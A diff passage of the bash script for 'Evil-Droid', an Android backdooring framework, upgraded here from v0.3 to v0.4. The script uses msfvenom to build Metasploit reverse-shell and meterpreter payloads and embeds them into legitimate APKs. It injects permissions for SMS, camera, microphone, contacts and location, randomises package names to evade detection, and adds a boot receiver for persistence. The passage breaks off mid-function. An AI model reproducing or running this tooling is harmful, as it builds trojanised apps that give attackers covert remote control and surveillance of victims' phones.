@@ -1,18 +1,20 @@
 #!/usr/bin/env bash
 #
-# Evil-Droid Framework . version 0.3
+# Evil-Droid Framework . version 0.4
 # Evil-Droid is a framework that create & generate & embed apk payload to penetrate android platform
 # 
 #                  Created By Mascerano Bachir .
-#                 Website: http://www.dev-labs.co
-#           YTB : https://www.youtube.com/c/mascerano%20bachir  
-#        FCB : https://www.facebook.com/kali.linux.pentesting.tutorials
-#Speciak thanks to : MrPedroubuntu , Kader Achraf , youcef yahia and Mohammed Yacine
+#                   Improved By TechSky - SRT .
+#                 Website: http://www.techskyhub.com
+#              YTB : https://www.youtube.com/@TechSky-EH
+#Special thanks to : MrPedroubuntu , Kader Achraf , youcef yahia and Mohammed Yacine
+#Enhanced by: Tech Sky - Security Research Team
 #
 # this is an open source tool if you want to modify or add something . Please give me a copy.
 
 # resize terminal window
-resize -s 40 70 > /dev/null
+resize -s 40 70 > /dev/null 2>&1
+
 #Colors
 cyan='\e[0;36m'
 lightcyan='\e[96m'
@@ -31,12 +33,15 @@ YellowF="${Escape}[33m";
 BlueF="${Escape}[34m";
 CyanF="${Escape}[36m";
 Reset="${Escape}[0m";
+
 # Check root
-[[ `id -u` -eq 0 ]] > /dev/null 2>&1 || { echo  $red "You must be root to run the script"; echo ; exit 1; }
+[[ `id -u` -eq 0 ]] > /dev/null 2>&1 || { echo -e $red "You must be root to run the script"; echo ; exit 1; }
 clear
+
 # check internet 
 function checkinternet() 
 {
+  echo -e $blue " Checking For Internet Connection..."
   ping -c 1 google.com > /dev/null 2>&1
   if [[ "$?" != 0 ]]
   then
@@ -46,30 +51,70 @@ function checkinternet()
     echo
     echo -e $yellow " Evil-Droid Exit"
     echo && sleep 2
-    exit
+    exit 1
   else
     echo -e $yellow " Checking For Internet: ${LighGreenF}CONNECTED"
   fi
 }
+
+# Enhanced installation function with consistent indicators
+function install_package() {
+    local package_name="$1"
+    local display_name="$2"
+    local alternative_packages=("${@:3}")
+    
+    echo -e $yellow "[ ! ] Installing $display_name"
+    echo -e $blue "    [⠋] Updating package list..."
+    
+    if sudo apt-get update > /dev/null 2>&1; then
+        echo -e $blue "    [⠙] Installing $package_name package..."
+        
+        # Try primary package first
+        if sudo apt-get install "$package_name" -y > /dev/null 2>&1; then
+            echo -e $green "[ ✔ ] $display_name.......................${LighGreenF}[ installed ]"
+            return 0
+        else
+            # Try alternative packages
+            for alt_package in "${alternative_packages[@]}"; do
+                echo -e $blue "    [⠹] Trying alternative: $alt_package..."
+                if sudo apt-get install "$alt_package" -y > /dev/null 2>&1; then
+                    echo -e $green "[ ✔ ] $display_name.......................${LighGreenF}[ installed ]"
+                    return 0
+                fi
+            done
+            
+            echo -e $red "[ ✗ ] $display_name.......................${RedF}[ installation failed ]"
+            return 1
+        fi
+    else
+        echo -e $red "[ ✗ ] $display_name.......................${RedF}[ update failed ]"
+        return 1
+    fi
+}
+
 checkinternet
 sleep 2
+
 #Define options
 path=`pwd`
-lanip=`hostname -I`
+lanip=`hostname -I | awk '{print $1}'`
 publicip=`dig +short myip.opendns.com @resolver1.opendns.com`
-ver="v0.3"
+ver="v0.4"
 APKTOOL="$path/tools/apktool.jar"
 VAR1=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
 VAR2=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
 VAR3=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Payload.smali renaming
-VAR4=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 1
-VAR5=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 2
-VAR6=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 3
+VAR4=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Package name renaming 1
+VAR5=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Package name renaming 2
+VAR6=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Package name renaming 3
 VAR7=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'payload'
 VAR8=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'metasploit'
+
 perms='   <uses-permission android:name="android.permission.INTERNET"/>\n    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\n    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>\n    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>\n    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>\n    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>\n    <uses-permission android:name="android.permission.SEND_SMS"/>\n    <uses-permission android:name="android.permission.RECEIVE_SMS"/>\n    <uses-permission android:name="android.permission.RECORD_AUDIO"/>\n    <uses-permission android:name="android.permission.CALL_PHONE"/>\n    <uses-permission android:name="android.permission.READ_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>\n    <uses-permission android:name="android.permission.CAMERA"/>\n    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>\n    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>\n    <uses-permission android:name="android.permission.SET_WALLPAPER"/>\n    <uses-permission android:name="android.permission.READ_CALL_LOG"/>\n    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>\n    <uses-permission android:name="android.permission.WAKE_LOCK"/>\n    <uses-permission android:name="android.permission.READ_SMS"/>'
+
 echo ""
 sleep 1
+
 # spinner for Metasploit Generator
 spinlong ()
 {
@@ -83,141 +128,198 @@ spinlong ()
         sleep 0.02
     done
 }
+
 # detect ctrl+c exiting
 trap ctrl_c INT
 ctrl_c() {
-clear
-echo -e $red"[*] (Ctrl + C ) Detected, Trying To Exit... "
-echo -e $red"[*] Stopping Services... "
-apache_svc_stop
-postgresql_stop
-sleep 1
-echo ""
-echo -e $yellow"[*] Thanks For Using Evil-Droid  :)"
-exit
+    clear
+    echo -e $red"[*] (Ctrl + C ) Detected, Trying To Exit... "
+    echo -e $red"[*] Stopping Services... "
+    apache_svc_stop
+    postgresql_stop
+    sleep 1
+    echo ""
+    echo -e $yellow"[*] Thanks For Using Evil-Droid  :)"
+    exit 1
 }
+
 #detect system
 echo -e $blue
 sudo cat /etc/issue.net
+
 #check dependencies existence
 echo -e $blue "" 
 echo "® Checking dependencies configuration ®" 
 echo "                                       " 
+
 # check if metasploit-framework is installed
 which msfconsole > /dev/null 2>&1
 if [ "$?" -eq "0" ]; then
-echo -e $green "[ ✔ ] Metasploit-Framework..............${LighGreenF}[ found ]"
-which msfconsole > /dev/null 2>&1
-sleep 2
+    echo -e $green "[ ✔ ] Metasploit-Framework..............${LighGreenF}[ found ]"
+    sleep 1
 else
-echo -e $red "[ X ] Metasploit-Framework  -> ${RedF}not found "
-echo -e $yellow "[ ! ] Installing Metasploit-Framework "
-sudo apt-get install metasploit-framework -y
-echo -e $blue "[ ✔ ] Done installing ...."
-which msfconsole > /dev/null 2>&1
-sleep 2
+    echo -e $red "[ ✗ ] Metasploit-Framework..............${RedF}[ not found ]"
+    install_package "metasploit-framework" "Metasploit-Framework"
+    sleep 1
 fi
+
 #check if xterm is installed
 which xterm > /dev/null 2>&1
 if [ "$?" -eq "0" ]; then
-echo -e $green "[ ✔ ] Xterm.............................${LighGreenF}[ found ]"
-which xterm > /dev/null 2>&1
-sleep 2
+    echo -e $green "[ ✔ ] Xterm.............................${LighGreenF}[ found ]"
+    sleep 1
 else
-echo ""
-echo -e $red "[ X ] xterm -> ${RedF}not found! "
-sleep 2
-echo -e $yellow "[ ! ] Installing Xterm "
-sleep 2
-echo -e $green ""
-sudo apt-get install xterm -y
-clear
-echo -e $blue "[ ✔ ] Done installing .... "
-which xterm > /dev/null 2>&1
+    echo -e $red "[ ✗ ] Xterm.............................${RedF}[ not found ]"
+    install_package "xterm" "Xterm"
+    sleep 1
 fi
+
 #check if zenity is installed
 which zenity > /dev/null 2>&1
 if [ "$?" -eq "0" ]; then
-echo -e $green "[ ✔ ] Zenity............................${LighGreenF}[ found ]"
-which zenity > /dev/null 2>&1
-sleep 2
+    echo -e $green "[ ✔ ] Zenity............................${LighGreenF}[ found ]"
+    sleep 1
 else
-echo ""
-echo -e $red "[ X ] Zenity -> ${RedF}not found! "
-sleep 2
-echo -e $yellow "[ ! ] Installing Zenity "
-sleep 2
-echo -e $green ""
-sudo apt-get install zenity -y
-clear
-echo -e $blue "[ ✔ ] Done installing .... "
-which zenity > /dev/null 2>&1
+    echo -e $red "[ ✗ ] Zenity............................${RedF}[ not found ]"
+    install_package "zenity" "Zenity"
+    sleep 1
 fi
+
 #Check for Android Asset Packaging Tool
 which aapt > /dev/null 2>&1
 if [ "$?" -eq "0" ]; then
-echo -e $green "[ ✔ ] Aapt..............................${LighGreenF}[ found ]"
-which aapt > /dev/null 2>&1
-sleep 2
+    echo -e $green "[ ✔ ] Aapt..............................${LighGreenF}[ found ]"
+    sleep 1
 else
-echo ""
-echo -e $red "[ X ] Aapt -> ${RedF}not found! "
-sleep 2
-echo -e $yellow "[ ! ] Installing Aapt "
-sleep 2
-echo -e $green ""
-sudo apt-get install aapt -y
-sudo apt-get install android-framework-res -y
-clear
-echo -e $blue "[ ✔ ] Done installing .... "
-which aapt > /dev/null 2>&1
+    echo -e $red "[ ✗ ] Aapt..............................${RedF}[ not found ]"
+    install_package "android-sdk-platform-tools-common" "Aapt" "aapt" "android-framework-res"
+    sleep 1
 fi
+
 #Check for Apktool Reverse Engineering
 which apktool > /dev/null 2>&1
 if [ "$?" -eq "0" ]; then
-echo -e $green "[ ✔ ] Apktool...........................${LighGreenF}[ found ]"
-which aapt > /dev/null 2>&1
-sleep 2
+    echo -e $green "[ ✔ ] Apktool...........................${LighGreenF}[ found ]"
+    sleep 1
 else
-echo ""
-echo -e $red "[ X ] Apktool -> ${RedF}not found! "
-sleep 2
-echo -e $yellow "[ ! ] Installing Apktool "
-sleep 2
-echo -e $green ""
-sudo apt-get install apktool -y
-clear
-echo -e $blue "[ ✔ ] Done installing .... "
-which apktool > /dev/null 2>&1
+    echo -e $red "[ ✗ ] Apktool...........................${RedF}[ not found ]"
+    install_package "apktool" "Apktool"
+    sleep 1
 fi
+
 #check for zipalign
 which zipalign > /dev/null 2>&1
 if [ "$?" -eq "0" ]; then
-echo -e $green "[ ✔ ] Zipalign..........................${LighGreenF}[ found ]"
-which aapt > /dev/null 2>&1
-sleep 2
+    echo -e $green "[ ✔ ] Zipalign..........................${LighGreenF}[ found ]"
+    sleep 1
 else
-echo ""
-echo -e $red "[ X ] Zipalign -> ${RedF}not found! "
-sleep 2
-echo -e $yellow "[ ! ] Installing Zipalign "
-sleep 2
-echo -e $green ""
-sudo apt-get install zipalign -y
-clear
-echo -e $blue "[ ✔ ] Done installing .... "
-which zipalign > /dev/null 2>&1
+    echo -e $red "[ ✗ ] Zipalign..........................${RedF}[ not found ]"
+    install_package "android-sdk-build-tools" "Zipalign" "zipalign"
+    sleep 1
 fi
+
+# check for apksigner
+which apksigner > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+    echo -e $green "[ ✔ ] Apksigner.........................${LighGreenF}[ found ]"
+    sleep 1
+else
+    echo -e $red "[ ✗ ] Apksigner.........................${RedF}[ not found ]"
+    install_package "android-sdk-build-tools" "Apksigner" "apksigner"
+    sleep 1
+fi
+
+# check for keytool (from default-jdk)
+which keytool > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+    echo -e $green "[ ✔ ] Keytool (JDK).....................${LighGreenF}[ found ]"
+    sleep 1
+else
+    echo -e $red "[ ✗ ] Keytool (JDK).....................${RedF}[ not found ]"
+    install_package "default-jdk" "Keytool (JDK)" "openjdk-11-jdk" "openjdk-8-jdk"
+    sleep 1
+fi
+
+# check for wget
+which wget > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+    echo -e $green "[ ✔ ] Wget..............................${LighGreenF}[ found ]"
+    sleep 1
+else
+    echo -e $red "[ ✗ ] Wget..............................${RedF}[ not found ]"
+    install_package "wget" "Wget"
+    sleep 1
+fi
+
+# check for curl (additional dependency)
+which curl > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+    echo -e $green "[ ✔ ] Curl..............................${LighGreenF}[ found ]"
+    sleep 1
+else
+    echo -e $red "[ ✗ ] Curl..............................${RedF}[ not found ]"
+    install_package "curl" "Curl"
+    sleep 1
+fi
+
+# check for unzip
+which unzip > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+    echo -e $green "[ ✔ ] Unzip.............................${LighGreenF}[ found ]"
+    sleep 1
+else
+    echo -e $red "[ ✗ ] Unzip.............................${RedF}[ not found ]"
+    install_package "unzip" "Unzip"
+    sleep 1
+fi
+
+echo -e $green "[ ✔ ] All dependencies checked"
+
+# Final verification of critical tools
+echo -e $blue ""
+echo "® Verifying critical dependencies ®"
+missing_tools=0
+
+# Check if critical tools are actually available
+critical_tools=("msfconsole" "apktool" "keytool" "zipalign")
+for tool in "${critical_tools[@]}"; do
+    if ! which "$tool" > /dev/null 2>&1; then
+        echo -e $red "[ ✗ ] Critical tool missing: $tool"
+        missing_tools=$((missing_tools + 1))
+    else
+        echo -e $green "[ ✔ ] $tool verified"
+    fi
+done
+
+if [ $missing_tools -gt 0 ]; then
+    echo -e $red "[ ! ] $missing_tools critical dependencies are missing"
+    echo -e $yellow "[ ! ] Framework may not work properly"
+    echo -e $yellow "[ ! ] Please install missing tools manually"
+    echo -e $yellow "[ ! ] Continue anyway? (y/N)"
+    read -r continue_anyway
+    if [[ ! "$continue_anyway" =~ ^[Yy]$ ]]; then
+        echo -e $red "Exiting..."
+        exit 1
+    fi
+else
+    echo -e $green "[ ✔ ] All critical dependencies verified"
+fi
+
+sleep 2
+
 directory="$path/evilapk"
 if [ ! -d "$directory" ]; then
-	echo "Creating the output directory..."
-	mkdir $directory
-        sleep 3
+    echo -e $blue "Creating the output directory..."
+    mkdir -p "$directory"
+    sleep 1
+    echo -e $green "[ ✔ ] Output directory created: $directory"
 fi
+
 echo -e $red "╔────────────────────────────────────────────────╗"
-echo -e $red "|    Evil-Droid Framework $ver - Dev-labs.co     |"
-echo -e $red "|   Please do not upload APK to VirusTotal.com   |"
+echo -e $red "|    Evil-Droid Framework $ver - Tech Sky - SRT  |"
+echo -e $red "|     Subscribe To Tech Sky - Ethical Hacking    |"
 echo -e $red "┖────────────────────────────────────────────────┙"
+
 #function ascii banner
 function print_ascii_art {
 echo -e $lightgreen "             .           .           "          
@@ -244,501 +346,672 @@ echo -e $lightgreen "             MMMMM   MMMMM           "
 echo -e $lightgreen "             MMMMM   MMMMM           "   
 echo -e $lightgreen "             MMMMM   MMMMM           "   
 echo -e $lightgreen "             .MMM.   .MMM.           " 
-echo -e $lightgreen "     Mascerano Bachir - Dev-labs     "                                 
+echo -e $lightgreen "     Mascerano Bachir - Dev-labs     "
+echo -e $lightgreen "  Tech Sky - Security Research Team     "                                 
 }
+
 #function lhost
 function get_lhost() 
 {
-  LHOST=$(zenity --title="☢ SET LHOST ☢" --text "Your-Local-ip: $lanip ; Your-Public-ip: $publicip" --entry-text "$lanip" --entry --width 300 2> /dev/null)
+    LHOST=$(zenity --title="☢ SET LHOST ☢" --text "Your-Local-ip: $lanip ; Your-Public-ip: $publicip" --entry-text "$lanip" --entry --width 300 2> /dev/null)
+    if [ -z "$LHOST" ]; then
+        echo -e $red "[ ✗ ] LHOST not specified, using default: $lanip"
+        LHOST="$lanip"
+    fi
 }
+
 #function lport
 function get_lport() 
 {
-  LPORT=$(zenity --title="☢ SET LPORT ☢" --text "example: 4444" --entry-text "4444" --entry --width 300 2> /dev/null)
+    LPORT=$(zenity --title="☢ SET LPORT ☢" --text "example: 4444" --entry-text "4444" --entry --width 300 2> /dev/null)
+    if [ -z "$LPORT" ]; then
+        echo -e $red "[ ✗ ] LPORT not specified, using default: 4444"
+        LPORT="4444"
+    fi
 }
+
 #function payload
 function get_payload()
 {
-  PAYLOAD=$(zenity --list --title "☢ EVIL-DROID ☢" --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" TRUE "android/shell/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" FALSE "android/meterpreter_reverse_tcp" FALSE "android/meterpreter_reverse_http" FALSE "android/meterpreter_reverse_https" --width 400 --height 400 2> /dev/null)
+    PAYLOAD=$(zenity --list --title "☢ EVIL-DROID ☢" --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" TRUE "android/shell/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" FALSE "android/meterpreter_reverse_tcp" FALSE "android/meterpreter_reverse_http" FALSE "android/meterpreter_reverse_https" --width 400 --height 400 2> /dev/null)
+    if [ -z "$PAYLOAD" ]; then
+        echo -e $red "[ ✗ ] Payload not specified, using default: android/shell/reverse_tcp"
+        PAYLOAD="android/shell/reverse_tcp"
+    fi
 }
+
 function get_payload1()
 {
-  PAYLOAD=$(zenity --list --title "☢ EVIL-DROID ☢" --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" TRUE "android/shell/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" --width 400 --height 400 2> /dev/null)
+    PAYLOAD=$(zenity --list --title "☢ EVIL-DROID ☢" --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" TRUE "android/shell/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" --width 400 --height 400 2> /dev/null)
+    if [ -z "$PAYLOAD" ]; then
+        echo -e $red "[ ✗ ] Payload not specified, using default: android/shell/reverse_tcp"
+        PAYLOAD="android/shell/reverse_tcp"
+    fi
 }
+
 #function name
 function payload_name()
 {
- apk_name=$(zenity --title "☢ PAYLOAD NAME ☢" --text "example: evilapk" --entry --entry-text "evilapk" --width 300 2> /dev/null)
+    apk_name=$(zenity --title "☢ PAYLOAD NAME ☢" --text "example: evilapk" --entry --entry-text "evilapk" --width 300 2> /dev/null)
+    if [ -z "$apk_name" ]; then
+        echo -e $red "[ ✗ ] APK name not specified, using default: evilapk"
+        apk_name="evilapk"
+    fi
 }
+
 #function original apk
 function orig_apk()
 {
- orig=$(zenity --title "☢ ORIGINAL APK ☢" --filename=$path --file-selection --file-filter "*.apk" --text "chose the original (apk)" 2> /dev/null) 
+    orig=$(zenity --title "☢ ORIGINAL APK ☢" --filename="$path" --file-selection --file-filter "*.apk" --text "chose the original (apk)" 2> /dev/null)
+    if [ -z "$orig" ] || [ ! -f "$orig" ]; then
+        echo -e $red "[ ✗ ] No original APK selected or file doesn't exist"
+        return 1
+    fi
 }
+
 #function change icon
 function change_icon()
 {
- iconos=$(zenity --title "☢ CHOOSE ICON ☢" --filename=$path --file-selection --file-filter "*.png" --text "chose your own icon." 2> /dev/null) 
+    iconos=$(zenity --title "☢ CHOOSE ICON ☢" --filename="$path" --file-selection --file-filter "*.png" --text "chose your own icon." 2> /dev/null)
+    if [ -z "$iconos" ] || [ ! -f "$iconos" ]; then
+        echo -e $red "[ ✗ ] No icon selected or file doesn't exist"
+        return 1
+    fi
 }
+
 #function generate payload
 function gen_payload()
 {
- echo -e $yellow ""
- echo "[*] Generating apk payload"
- spinlong
- xterm -T " GENERATE APK PAYLOAD" -e msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o $apk_name.apk > /dev/null 2>&1
+    echo -e $yellow ""
+    echo "[*] Generating apk payload"
+    spinlong
+    if ! xterm -T " GENERATE APK PAYLOAD" -e msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -a dalvik --platform android R -o "$apk_name.apk" > /dev/null 2>&1; then
+        echo -e $red "[ ✗ ] Failed to generate payload"
+        return 1
+    fi
 }
+
 function embed_payload()
 {
- echo -e $yellow ""
- echo "[*] Embeding apk payload in orginal apk"
- spinlong
- xterm -T " EMBED APK PAYLOAD" -e msfvenom -x $orig -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o $apk_name.apk > /dev/null 2>&1
+    echo -e $yellow ""
+    echo "[*] Embedding apk payload in original apk"
+    spinlong
+    if ! xterm -T " EMBED APK PAYLOAD" -e msfvenom -x "$orig" -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -a dalvik --platform android R -o "$apk_name.apk" > /dev/null 2>&1; then
+        echo -e $red "[ ✗ ] Failed to embed payload"
+        return 1
+    fi
 }
+
 #function update apktool
-function up_apktook()
+function up_apktool()
 {
- echo -e $yellow ""
- echo "[*] Removing 1.apk framework file..."
- spinlong
- apktool empty-framework-dir --force > /dev/null 2>&1
+    echo -e $yellow ""
+    echo "[*] Removing framework files..."
+    spinlong
+    apktool empty-framework-dir --force > /dev/null 2>&1
 }
+
 #function apktool
 function apk_decomp()
 {
- echo -e $yellow ""
- echo "[*] Decompiling Payload APK..."
- spinlong
- xterm -T "Decompiling Payload" -e java -jar $APKTOOL d -f -o $path/payload $path/$apk_name.apk > /dev/null 2>&1
- rm $apk_name.apk
+    echo -e $yellow ""
+    echo "[*] Decompiling Payload APK..."
+    spinlong
+    if ! xterm -T "Decompiling Payload" -e java -jar "$APKTOOL" d -f -o "$path/payload" "$path/$apk_name.apk" > /dev/null 2>&1; then
+        echo -e $red "[ ✗ ] Failed to decompile payload APK"
+        return 1
+    fi
+    rm -f "$apk_name.apk"
 }
+
 function apk_comp()
 {
- echo -e $yellow ""
- echo "[*] Rebuilding APK file..."
- spinlong
- xterm -T "Rebuilding APK" -e java -jar $APKTOOL b $path/payload -o evil.apk > /dev/null 2>&1
- rm -r payload > /dev/null 2>&1
+    echo -e $yellow ""
+    echo "[*] Rebuilding APK file..."
+    spinlong
+    if ! xterm -T "Rebuilding APK" -e java -jar "$APKTOOL" b "$path/payload" -o evil.apk > /dev/null 2>&1; then
+        echo -e $red "[ ✗ ] Failed to rebuild APK"
+        return 1
+    fi
+    rm -rf payload > /dev/null 2>&1
 }
+
 function apk_decomp1()
 {
- echo -e $yellow ""
- echo "[*] Decompiling Original APK..."
- spinlong
- xterm -T "Decompiling Original" -e java -jar $APKTOOL d -f -o $path/original $orig > /dev/null 2>&1
+    echo -e $yellow ""
+    echo "[*] Decompiling Original APK..."
+    spinlong
+    if ! xterm -T "Decompiling Original" -e java -jar "$APKTOOL" d -f -o "$path/original" "$orig" > /dev/null 2>&1; then
+        echo -e $red "[ ✗ ] Failed to decompile original APK"
+        return 1
+    fi
 }
+
 function apk_comp1()
 {
- echo -e $yellow ""
- echo "[*] Rebuilding Backdoored APK..."
- spinlong
- xterm -T "Rebuilding APK" -e java -jar $APKTOOL b $path/original -o evil.apk > /dev/null 2>&1
- rm -r payload > /dev/null 2>&1
- rm -r original > /dev/null 2>&1
+    echo -e $yellow ""
+    echo "[*] Rebuilding Backdoored APK..."
+    spinlong
+    if ! xterm -T "Rebuilding APK" -e java -jar "$APKTOOL" b "$path/original" -o evil.apk > /dev/null 2>&1; then
+        echo -e $red "[ ✗ ] Failed to rebuild backdoored APK"
+        return 1
+    fi
+    rm -rf payload > /dev/null 2>&1
+    rm -rf original > /dev/null 2>&1
 }
+
 #function errors
 function error()
 {
- rc=$?
- if [ $rc != 0 ]; then
-   echo -e $red ""
-   echo "【X】 Failed to rebuild backdoored apk【X】"
-   echo
-   apache_svc_stop
-   postgresql_stop
-   exit $rc
- fi
+    rc=$?
+    if [ $rc != 0 ]; then
+        echo -e $red ""
+        echo "【X】 Failed to rebuild backdoored apk【X】"
+        echo
+        apache_svc_stop
+        postgresql_stop
+        exit $rc
+    fi
 }
+
 function error0()
 {
- rc=$?
- if [ $rc != 0 ]; then
-   echo -e $red ""
-   echo "【X】 An Error Was Occured .Ty Again【X】"
-   echo
-   apache_svc_stop
-   postgresql_stop
-   exit $rc
- fi
+    rc=$?
+    if [ $rc != 0 ]; then
+        echo -e $red ""
+        echo "【X】 An Error Was Occurred. Try Again【X】"
+        echo
+        apache_svc_stop
+        postgresql_stop
+        exit $rc
+    fi
 }
+
 #function apache2 service
 function apache_svc_start()
 {
- service apache2 start | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Start apache2 service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+    echo -e $blue "[*] Starting Apache2 service..."
+    if service apache2 start > /dev/null 2>&1; then
+        echo -e $green "[ ✔ ] Apache2 service started"
+    else
+        echo -e $red "[ ✗ ] Failed to start Apache2 service"
+    fi
 }
+
 function apache_svc_stop()
 {
- service apache2 stop | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Stop apache2 service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+    echo -e $blue "[*] Stopping Apache2 service..."
+    if service apache2 stop > /dev/null 2>&1; then
+        echo -e $green "[ ✔ ] Apache2 service stopped"
+    else
+        echo -e $red "[ ✗ ] Failed to stop Apache2 service"
+    fi
 }
+
 #function postgresql service
 function postgresql_start()
 {
- service postgresql start | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Start postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+    echo -e $blue "[*] Starting PostgreSQL service..."
+    if service postgresql start > /dev/null 2>&1; then
+        echo -e $green "[ ✔ ] PostgreSQL service started"
+    else
+        echo -e $red "[ ✗ ] Failed to start PostgreSQL service"
+    fi
 }
+
 function postgresql_stop()
 {
- service postgresql stop | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+    echo -e $blue "[*] Stopping PostgreSQL service..."
+    if service postgresql stop > /dev/null 2>&1; then
+        echo -e $green "[ ✔ ] PostgreSQL service stopped"
+    else
+        echo -e $red "[ ✗ ] Failed to stop PostgreSQL service"
+    fi
 }
+
 # function adding permission
 function perms()
 {
- echo -e $yellow ""
- echo "[*] Adding permission and Hook Smali"
- spinlong
- package_name=`head -n 2 $path/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'` 2>&1
- package_dash=`head -n 2 $path/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'|sed 's|/|.|g'` 2>&1
- tmp=$package_name
- sed -i "5i\ $perms" $path/original/AndroidManifest.xml
- rm $path/payload/smali/com/metasploit/stage/MainActivity.smali 2>&1
- sed -i "s|Lcom/metasploit|L$package_name|g" $path/payload/smali/com/metasploit/stage/*.smali 2>&1
- cp -r $path/payload/smali/com/metasploit/stage $path/original/smali/$package_name > /dev/null 2>&1
- rc=$?
- if [ $rc != 0 ];then
-  app_name=`grep "<application" $path/original/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's%/[^/]*$%%'` 2>&1
-  app_dash=`grep "<application" $path/original/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's|/|.|g'|sed 's%.[^.]*$%%'` 2>&1
-  tmp=$app_name
-  sed -i "s|L$package_name|L$app_name|g" $path/payload/smali/com/metasploit/stage/*.smali 2>&1
-  cp -r $path/payload/smali/com/metasploit/stage $path/original/smali/$app_name > /dev/null 2>&1
-  amanifest="    </application>"
-  boot_cmp='        <receiver android:label="MainBroadcastReceiver" android:name="'$app_dash.stage.MainBroadcastReceiver'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$app_dash.stage.MainService'"/></application>'
-  sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1    
- fi
- amanifest="    </application>"
- boot_cmp='        <receiver android:label="MainBroadcastReceiver" android:name="'$package_dash.stage.MainBroadcastReceiver'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$package_dash.stage.MainService'"/></application>'
- sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1    
- android_nam=$tmp
+    echo -e $yellow ""
+    echo "[*] Adding permission and Hook Smali"
+    spinlong
+    package_name=$(head -n 2 "$path/original/AndroidManifest.xml" | grep "<manifest" | grep -o -P 'package="[^\"]+"' | sed 's/\"//g' | sed 's/package=//g' | sed 's/\./\//g') 2>&1
+    package_dash=$(head -n 2 "$path/original/AndroidManifest.xml" | grep "<manifest" | grep -o -P 'package="[^\"]+"' | sed 's/\"//g' | sed 's/package=//g' | sed 's/\./\//g' | sed 's|/|.|g') 2>&1
+    tmp=$package_name
+    sed -i "5i\\ $perms" "$path/original/AndroidManifest.xml"
+    rm -f "$path/payload/smali/com/metasploit/stage/MainActivity.smali" 2>&1
+    sed -i "s|Lcom/metasploit|L$package_name|g" "$path/payload/smali/com/metasploit/stage/"*.smali 2>&1
+    cp -r "$path/payload/smali/com/metasploit/stage" "$path/original/smali/$package_name" > /dev/null 2>&1
+    rc=$?
+    if [ $rc != 0 ]; then
